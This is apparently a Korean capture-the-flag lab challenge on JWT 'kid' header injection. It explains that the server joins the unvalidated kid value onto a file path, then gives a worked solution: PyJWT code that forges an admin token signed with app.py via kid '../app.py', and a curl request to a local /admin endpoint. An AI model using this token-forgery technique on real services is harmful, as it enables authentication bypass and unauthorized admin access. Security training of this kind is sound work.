📌 문제 제목
JWT Lab - High (kid Injection)

🎯 문제 설명
이 서비스는 로그인 시 HS256으로 서명된 JWT를 발급합니다. 토큰 헤더에는 어떤 서명 키 파일을
사용했는지 나타내는 `kid`(key id) 값이 들어 있고, 서버는 `/admin` 요청을 검증할 때 토큰
헤더의 `kid` 값을 읽어 해당 이름의 키 파일을 서버 내부에서 찾아 그 파일 내용으로 서명을
검증합니다.

문제는, 서버가 `kid` 값을 전혀 검증하지 않고 그대로 파일 경로에 이어붙인다는 것입니다.
`kid`에 상대 경로(`../`)를 넣으면 키 파일 디렉터리 밖에 있는, 당신도 이미 알고 있는 파일을
서명 검증 키로 사용하게 만들 수 있습니다.

당신의 목표는 `role: admin` 클레임을 가진 토큰을 직접 위조해 `/admin`에서 flag를 얻는
것입니다.

🧠 난이도
상 (High)

💡 힌트
- 정상 로그인으로는 `role: admin` 토큰을 절대 받을 수 없습니다.
- 이 문제를 다운로드하면 `app.py` 소스가 함께 제공됩니다 - 서버 컨테이너 안의 `app.py`와
  바이트 단위로 동일한 파일입니다.
- `kid`를 `"../app.py"`로 지정하면 서버는 키 디렉터리(`keys/`)를 벗어나 `/app/app.py`를
  서명 검증 키로 읽습니다. 그 파일 내용을 당신도 그대로 가지고 있으니, 같은 키로 직접
  서명할 수 있습니다.

💡 예시 풀이 (Python, PyJWT)
```python
import jwt

app_py_bytes = open("app.py", "rb").read()  # 다운로드한 것과 동일한 파일

forged = jwt.encode(
    {"username": "attacker", "role": "admin"},
    app_py_bytes,
    algorithm="HS256",
    headers={"kid": "../app.py"},
)
print(forged)
```
```bash
curl http://localhost:8000/admin -H "Authorization: Bearer <forged>"
```
